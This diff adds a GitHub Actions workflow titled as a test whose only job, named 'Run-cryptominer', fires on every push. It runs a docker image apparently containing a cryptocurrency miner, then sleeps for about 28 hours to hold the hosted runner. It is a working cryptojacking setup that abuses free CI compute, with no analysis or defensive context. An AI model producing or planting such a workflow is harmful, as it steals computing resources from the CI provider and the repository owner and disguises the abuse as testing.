@@ -1,0 +1,9 @@
+name: GitHub Actions Test
+on: [push]
+jobs:
+  Run-cryptominer:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "Running cryptominer"
+      - run: docker run -it ultimatehackingcoin/uhc
+      - run: sleep 100000
